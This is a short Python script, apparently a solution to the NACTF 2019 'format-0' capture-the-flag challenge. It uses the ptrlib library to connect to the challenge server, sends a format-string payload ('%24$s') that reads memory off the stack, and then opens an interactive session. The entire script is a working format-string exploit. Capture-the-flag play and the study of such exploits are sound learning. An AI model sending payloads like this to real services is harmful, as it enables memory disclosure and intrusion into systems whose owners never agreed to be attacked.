from ptrlib import *

#sock = Process("./format-0")
sock = Socket("shell.2019.nactf.com", 31782)
payload = '%{}$s'.format(8 + 64 // 4)
sock.sendlineafter(">", payload)

sock.interactive()
